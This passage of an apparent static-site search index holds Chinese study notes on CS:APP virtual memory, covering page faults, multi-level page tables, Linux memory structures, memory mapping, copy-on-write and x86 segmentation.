\u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u53d1\u51fa\u8bf7\u6c42 \u2462. \u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u5411 MMU \u8fd4\u56de PTE \u7684\u5185\u5bb9 \u2463. MMU \u6784\u9020\u7269\u7406\u5730\u5740\uff0c\u4f20\u56de\u7ed9 \u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u2464. \u9ad8\u901f\u4e3b\u5b58/\u7f13\u5b58 \u8fd4\u56de\u7269\u7406\u5730\u5740\u7ed9 cpu \u7f3a\u9875\u65f6\uff0cCPU \u786c\u4ef6\u548c\u5185\u6838\u7684\u5de5\u4f5c\u6d41\u7a0b \u2460 \uff5e \u2462. \u548c\u9875\u9762\u547d\u4e2d\u65f6\u7684\u6d41\u7a0b\u76f8\u540c \u2463. PTE \u4e2d\u6709\u6548\u4f4d\u662f 0\uff0cMMU \u636e\u6b64\u89e6\u53d1\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f20\u9012\u63a7\u5236\u7ed9 OS \u5185\u6838\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f \u2464 \uff5e \u2465. \u5904\u7406\u7a0b\u5e8f\u786e\u5b9a\u4e3b\u5b58\u4e2d\u7684\u727a\u7272\u9875\uff0c\u82e5\u8be5\u9875\u88ab\u4fee\u6539\uff0c\u5219\u5c06\u5176\u6362\u51fa\u5230\u78c1\u76d8\uff1b\u7136\u540e\uff0c\u8c03\u5165\u65b0\u9875\u5e76\u66f4\u65b0 PTE \u2466. \u7f3a\u9875\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u5230\u539f\u6765\u7684\u8fdb\u7a0b\uff0c\u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u7f3a\u9875\u7684\u6307\u4ee4","title":"(2). \u5730\u5740\u7ffb\u8bd1"},{"location":"_csapp/_Memory/vm/#3","text":"\u76f4\u63a5\u5b9e\u73b0\u9875\u8868\u7684\u95ee\u9898: \u4ee5 32 \u4f4d\u5730\u5740\u7a7a\u95f4\u4e3a\u4f8b\uff0c\u6bcf\u4e2a PTE \u9700\u8981 $4\\rm byte$\uff0c\u5047\u8bbe\u9875\u9762\u5927\u5c0f $4\\rm KB=2^{12} byte$\uff0c\u5219\u5185\u5b58\u9700\u8981\u5e38\u9a7b\u4e00\u4e2a $\\rm 2^{32}/2^{12}\\times 4 byte = 4MB$ \u7684\u9875\u8868\u3002\u5bf9\u4e8e 64 \u4f4d\u7a7a\u95f4\u60c5\u51b5\u5c06\u66f4\u590d\u6742 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u8fdb\u7a0b $4\\rm G$ \u7684\u5730\u5740\u7a7a\u95f4\u53ef\u80fd\u6709\u5f88\u591a\u90fd\u662f\u672a\u5206\u914d\u7684 \u901a\u5e38\u7528\u5c42\u6b21\u7ed3\u6784\u538b\u7f29\u9875\u8868\uff0c\u4ee5 2 \u7ea7\u9875\u8868\u4e3a\u4f8b: \u2003\u2003 \u4e00\u7ea7\u9875\u8868\u7684 PTE \u6620\u5c04\u4e00\u4e2a $\\rm 4MB$ \u7684 chunk\uff0c\u82e5 chunk i \u6bcf\u4e2a\u9875\u90fd\u662f\u672a\u5206\u914d\uff0cPTE i \u4e3a\u7a7a\uff1b\u5426\u5219 PTE i \u6307\u5411\u4e00\u4e2a\u4e8c\u7ea7\u9875\u8868\u7684\u57fa\u5740\uff0c\u4e8c\u7ea7\u9875\u8868\u7684 PTE \u8d1f\u8d23\u6620\u5c04\u4e00\u4e2a $4\\rm KB$ \u7684\u865a\u62df\u9875\u3002\u591a\u7ea7\u9875\u8868\u56e0\u800c\u8282\u7701\u4e86\u5185\u5b58: \u82e5\u4e00\u7ea7\u9875\u8868\u672a\u7a7a\uff0c\u4e8c\u7ea7\u9875\u8868\u4e0d\u9700\u8981\u5b58\u5728 \u53ea\u6709\u4e00\u7ea7\u9875\u8868\u5e38\u9a7b\u4e3b\u5b58\uff0c\u4e8c\u7ea7\u9875\u8868\u5e38\u7528\u7684\u90e8\u5206\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d","title":"(3). \u591a\u7ea7\u9875\u8868"},{"location":"_csapp/_Memory/vm/#2-leftrightarrow","text":"","title":"2. \u865a\u62df\u5185\u5b58 $\\leftrightarrow$ \u78c1\u76d8: \u5185\u5b58\u6620\u5c04"},{"location":"_csapp/_Memory/vm/#1-linux","text":"Linux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u7ed3\u6784\u5982\u56fe \u865a\u62df\u5185\u5b58\u662f\u6bb5\u7684\u96c6\u5408\uff0c\u6bb5\u4e4b\u95f4\u53ef\u4ee5\u6709\u95f4\u9699\uff0c\u6bb5\u7531\u5df2\u5206\u914d\u7684\u865a\u62df\u9875\u7ec4\u6210\uff0c\u95f4\u9699\u5bf9\u5e94\u672a\u5206\u914d\u7684\u865a\u62df\u9875\uff0c\u672a\u5206\u914d\u7684\u865a\u62df\u9875\u4e0d\u5360\u7528\u78c1\u76d8\u7a7a\u95f4 \u5185\u6838\u865a\u62df\u5185\u5b58\u7684\u76f8\u540c\u90e8\u5206: \u5185\u6838\u4ee3\u7801\u3001\u5168\u5c40\u6570\u636e\u7ed3\u6784 \u88ab\u6620\u5c04\u5230\u6240\u6709\u8fdb\u7a0b\u5171\u4eab\u7684\u7269\u7406\u9875\u9762 \u7269\u7406\u5185\u5b58\u90e8\u5206\u548c\u4e3b\u5b58\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u5176\u5b58\u5728\u662f\u4e3a\u4e86\u65b9\u4fbf\u5185\u6838\u8bbf\u95ee\u4e3b\u5b58\u7279\u5b9a\u4f4d\u7f6e\uff0c\u4f8b\u5982\u8bbf\u95ee\u9875\u8868 \u5185\u6838\u865a\u62df\u5185\u5b58\u7684\u4e0d\u540c\u90e8\u5206: \u4fdd\u5b58\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u4f8b\u5982 PCB\u3001\u5185\u6838\u6808\u3001\u9875\u8868","title":"(1). Linux \u865a\u62df\u5185\u5b58\u7ed3\u6784"},{"location":"_csapp/_Memory/vm/#2-pcb","text":"Linux \u7684 PCB \u662f\u7ed3\u6784\u4f53 task_struct \uff0c\u5176\u4e2d\u4fdd\u5b58\u4e86\u8fd0\u884c\u8be5\u8fdb\u7a0b\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f8b\u5982 PID\u3001PC\u3001\u5bc4\u5b58\u5668\u503c\u3001\u4f18\u5148\u7ea7\u3001IO \u72b6\u6001\u3001\u53ef\u6267\u884c\u6587\u4ef6\u540d\u5b57\u7b49\u3002 \u2003\u2003 task_struct \u7684\u4e00\u4e2a\u6761\u76ee\u6307\u5411 mm_struct \uff0c\u63cf\u8ff0 VM \u7684\u72b6\u6001\uff1b\u5176\u4e2d\u611f\u5174\u8da3\u7684\u5b57\u6bb5: pgd \u6307\u5411\u4e00\u7ea7\u9875\u8868\u7684\u57fa\u5740 mmap \u6307\u5411\u533a\u57df\u7ed3\u6784 mm_area_structs \u7684\u94fe\u8868\uff0c mmap_rb \u6307\u5411\u76f8\u540c\u5143\u7d20\u7684\u7ea2\u9ed1\u6811 (\u7cfb\u7edf\u7ea7\u5185\u5b58\u6620\u5c04) vm_start / vm_end \u6bb5\u7684\u5f00\u59cb\u548c\u7ed3\u675f vm_prot \u8be5\u6bb5\u5305\u542b\u7684\u6240\u6709\u9875\u7684\u8bfb\u5199\u6743\u9650 vm_flags \u8be5\u6bb5\u662f\u5171\u4eab\u8fd8\u662f\u79c1\u6709 (\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f) vm_file \u8be5\u6bb5\u7684\u5185\u5b58\u6620\u5c04\u7684\u6587\u4ef6\u4fe1\u606f Linux \u7f3a\u9875\u5224\u65ad\u903b\u8f91 \u5047\u8bbe MMU \u8bd5\u56fe\u7ffb\u8bd1\u67d0\u4e2a\u5730\u5740 $\\rm A$ \u65f6\uff0c\u89e6\u53d1\u4e86\u4e00\u4e2a\u7f3a\u9875\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91\u4e3a: \u5224\u65ad $\\rm A$ \u662f\u5426\u5728\u67d0\u4e2a vm_area_structs \u6307\u5b9a\u7684\u533a\u57df\u5185 (\u5224\u65ad\u662f\u5426\u5df2\u5206\u914d?)\uff0c\u5982\u679c\u4e0d\u5728\u5219\u89e6\u53d1\u6bb5\u9519\u8bef\u5e76\u7ec8\u6b62\u8fd9\u4e2a\u8fdb\u7a0b \u5224\u65ad\u662f\u5426\u6709\u6743\u9650\u8bfb\u6216\u5199\u8be5\u9875\uff0c\u82e5\u4e0d\u5408\u6cd5\u5219\u89e6\u53d1\u4e00\u4e2a\u4fdd\u62a4\u5f02\u5e38 \u6b64\u65f6\uff0c\u5185\u6838\u77e5\u9053\u8fd9\u4e2a\u7f3a\u9875\u662f\u5bf9\u5408\u6cd5\u865a\u62df\u5730\u5740\u8fdb\u884c\u5408\u6cd5\u64cd\u4f5c\u9020\u6210\u7684\u3002\u5185\u6838\u9009\u62e9\u4e00\u4e2a\u727a\u7272\u9875 (\u82e5\u4fee\u6539\u8fc7\u5219\u5199\u56de\u78c1\u76d8)\uff0cCPU \u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u7f3a\u9875\u7684\u6307\u4ee4","title":"(2). PCB"},{"location":"_csapp/_Memory/vm/#3_1","text":"\u5185\u5b58\u6620\u5c04\u628a\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u96c6\u6210\u5230\u4f20\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u800c\u9ad8\u6548 (\u8282\u7ea6\u4e3b\u5b58) \u7684\u65b9\u5f0f\u52a0\u8f7d\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u65b9\u5f0f\u3002 \u4e00\u4e2a\u6587\u4ef6\u88ab\u6620\u5c04\u5230\u865a\u62df\u5185\u5b58\u7684\u4e00\u4e2a\u533a\u57df: \u4f5c\u4e3a\u5171\u4eab\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u5bf9\u865a\u5b58\u5171\u4eab\u533a\u7684\u5199\u64cd\u4f5c\uff0c\u4e5f\u4f1a\u53cd\u6620\u5230\u539f\u59cb\u6587\u4ef6\u4e2d (\u6ca1\u627e\u5230\u4f8b\u5b50) \u4f5c\u4e3a\u79c1\u6709\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u5bf9\u79c1\u6709\u533a\u7684\u5199\u64cd\u4f5c\uff0c\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u4e14\u4e0d\u9700\u8981\u53cd\u6620\u5230\u539f\u6587\u4ef6\u4e2d\uff0c\u4f7f\u7528\u5199\u65f6\u590d\u5236 (copy-on-write) \u8282\u7701\u5185\u5b58 Linux \u865a\u62df\u5185\u5b58\u7684\u5171\u4eab\u673a\u5236 \u8fdb\u7a0b 1 \u5c06\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u81ea\u5df1\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\u4e2d \u8fdb\u7a0b 2 \u5c06\u540c\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u81ea\u5df1\u7684\u865a\u5b58\u533a\u57df\uff0c\u7531\u4e8e\u6bcf\u4e2a\u5bf9\u8c61\u6709\u552f\u4e00\u7684\u6587\u4ef6\u540d\uff0c\u5185\u6838\u53ef\u4ee5\u5224\u5b9a\u5df2\u7ecf\u6709\u8fdb\u7a0b\u5171\u4eab\u4e86\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4e3b\u5b58\u4e2d\u53ea\u9700\u8981\u5b58\u653e\u4e00\u4e2a\u526f\u672c\u5373\u53ef (\u731c\u6d4b: \u8fdb\u7a0b 2 \u82e5\u53d1\u73b0\u5171\u4eab\u533a\u57df\u672a\u7f13\u5b58\uff0c\u4f1a\u5148\u53bb\u8fdb\u7a0b\u4e00\u7684\u9875\u8868\u770b\u770b\u7f13\u5b58\u6ca1\u6709\uff0c\u518d\u51b3\u5b9a\u662f\u5426\u89e6\u53d1\u7f3a\u9875) \u6682\u65f6\u6ca1\u627e\u5230\u9700\u8981\u4fee\u6539\u5171\u4eab\u5bf9\u8c61\u7684\u4f8b\u5b50\uff0c\u4e66\u91cc\u4e5f\u6ca1\u63d0 \u8fdb\u7a0b 1 \u548c\u8fdb\u7a0b 2 \u6620\u5c04\u4e86\u4e00\u4e2a\u79c1\u6709\u5bf9\u8c61\uff0c\u7531\u4e8e\u8fd8\u6ca1\u5199\u5165\uff0c\u5148\u6682\u65f6\u5171\u4eab\uff0c\u5e76\u5c06\u9875\u8868\u6761\u76ee\u90fd\u6807\u8bb0\u4e3a\u53ea\u8bfb (\u4e3a\u4e86\u89e6\u53d1\u5f02\u5e38)\uff0c\u5c06 area_struct \u90fd\u6807\u8bb0\u4e3a\u5199\u65f6\u590d\u5236 \u5f53\u6709\u4e00\u4e2a\u8fdb\u7a0b\u5411\u79c1\u6709\u533a\u57df\u6267\u884c\u4e00\u4e2a\u5199\u64cd\u4f5c\uff0c\u4f1a\u8df3\u8f6c\u5230\u6545\u969c\u5904\u7406\u7a0b\u5e8f\uff0c\u521b\u5efa\u4e00\u4e2a\u88ab\u5199\u7684\u865a\u62df\u9875\u7684\u526f\u672c\uff0c\u7136\u540e\u5199\u8fdb\u7a0b\u66f4\u65b0 PTE\uff0c\u6700\u540e\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\uff0c\u91cd\u65b0\u6267\u884c\u8fd9\u4e2a\u5199\u64cd\u4f5c \u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406 \u8fd9\u91cc\u7684\u6bb5\u548c\u7a0b\u5e8f\u5206\u6bb5\u4e0d\u662f\u4e00\u4e2a\u6982\u5ff5\uff0c\u662f\u5b8c\u5168\u7684\u5904\u7406\u5668\u6982\u5ff5\uff0c\u662f x86 \u67b6\u6784\u72ec\u6709\u7684\uff0cLinux \u6ca1\u6709\u8003\u8651 8086: \u2002 cpu \u53ea\u6709 16 \u4f4d \u800c\u5730\u5740\u603b\u7ebf\u6709 20 \u4f4d\uff0c\u56e0\u6b64\u901a\u8fc7 cpu \u548c\u5bc4\u5b58\u5668 16 \u4f4d\u6bb5\u57fa\u5740 + 4 \u4f4d\u6bb5\u504f\u79fb\u5bfb\u5740 80386: \u2002 \u5f15\u5165\u4e86\u865a\u62df\u5185\u5b58\u7684\u6982\u5ff5\uff0c\u5bfb\u5740\u6a21\u5f0f\u53d8\u4e3a \u903b\u8f91\u5730\u5740 -\u6bb5\u8868-> \u7ebf\u6027\u5730\u5740 (VM) -\u9875\u8868-> \u7269\u7406\u5730\u5740 x86-64: \u2002 \u5e9f\u5f03\u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406 \u9875\u5f0f\u5185\u5b58\u7ba1\u7406\u51fa\u73b0\u5728\u6bb5\u5f0f\u4e4b\u540e\uff0c\u662f\u66f4\u5148\u8fdb\u7684\u6982\u5ff5\uff0c80386 \u7684\u590d\u6742\u8bbe\u8ba1\u6ca1\u5fc5\u8981\u6df1\u7a76\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u4e3a\u4e86\u517c\u5bb9","title":"(3). \u5185\u5b58\u6620\u5c04"},{"location":"_csapp/_Memory/vm/#_1","text":"\u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u4e00\u79cd\u62bd\u8c61\uff0c\u7531\u4e24\u90e8\u5206\u7ec4\u6210 \u901a\u8fc7\u9875\u5f0f\u7ba1\u7406 (\u7f13\u5b58) \u548c\u4e3b\u5b58\u5173\u8054 (\u786c\u4ef6 + OS \u5f02\u5e38\uff0c\u7ba1\u7406\u9875\u9762) \u901a\u8fc7\u5185\u5b58\u6620\u5c04\u548c\u6587\u4ef6\u7cfb\u7edf\u5173\u8054 (OS\uff0c\u5206\u914d\u9875\u9762) \u865a\u62df\u5185\u5b58\u9664\u4e86\u4f7f\u7528\u7f13\u5b58\u8282\u7701\u4e86\u4e3b\u5b58\u7684\u7a7a\u95f4\u5916\uff0c\u5728\u5185\u5b58\u7ba1\u7406\u65b9\u9762\u8fd8\u6709\u5f88\u591a\u4f18\u70b9: \u7b80\u5316\u52a0\u8f7d: loader \u53ea\u9700\u8981\u5b9e\u73b0\u7c7b\u4f3c\u5185\u5b58\u6620\u5c04\u7684\u529f\u80fd\uff0c\u5206\u914d\u865a\u62df\u9875\uff0c\u5e76\u5c06\u6587\u4ef6\u7684 section \u6620\u5c04\u5230 vm_area_structs \u4e0a\uff0c\u8be5\u8fc7\u7a0b\u5e76\u6ca1\u6709\u4ece\u78c1\u76d8\u5411\u4e3b\u5b58\u62f7\u8d1d\u4efb\u4f55\u5185\u5bb9 \u7b80\u5316\u94fe\u63a5: \u4e0d\u540c\u8fdb\u7a0b\u6709\u76f8\u540c\u5e03\u5c40\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u4f7f\u5f97\u94fe\u63a5\u5668\u7684\u5b9e\u73b0\u4e0d\u7528\u8003\u8651\u5b9e\u9645\u7684\u7269\u7406\u5730\u5740 \u7b80\u5316\u5171\u4eab: \u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab\u7684\u90e8\u5206\uff0c\u5728\u7269\u7406\u5185\u5b58\u4e2d (\u548c\u78c1\u76d8\u4e0a?) \u53ea\u9700\u8981\u4e00\u4e2a\u526f\u672c \u7b80\u5316\u5185\u5b58\u5206\u914d: \u548c\u52a0\u8f7d\u4e00\u6837\uff0c\u53ea\u9700\u5206\u914d\u8fde\u7eed\u7684\u865a\u62df\u9875\u7136\u540e\u505a\u5185\u5b58\u6620\u5c04\u5373\u53ef\uff0c\u4e0d\u5fc5\u7269\u7406\u5185\u5b58\u5982\u4f55\u5de5\u4f5c (\u4f8b\u5982\u4e0d\u9700\u8981\u5173\u5fc3\u7269\u7406\u9875\u662f\u5426\u8fde\u7eed) \u7b80\u5316\u6743\u9650\u63a7\u5236: \u5728 PTE \u4e0a\u8bbe\u7f6e\u6807\u8bb0\u4f4d\uff0c\u5b9e\u73b0\u8bfb\u5199\u6743\u9650\u3001\u8fdb\u7a0b\u5728\u8d85\u7ea7\u7528\u6237\u6a21\u5f0f\u4e0b\u624d\u80fd\u8bbf\u95ee\u8be5\u9875\u7b49","title":"\u603b\u7ed3"}]}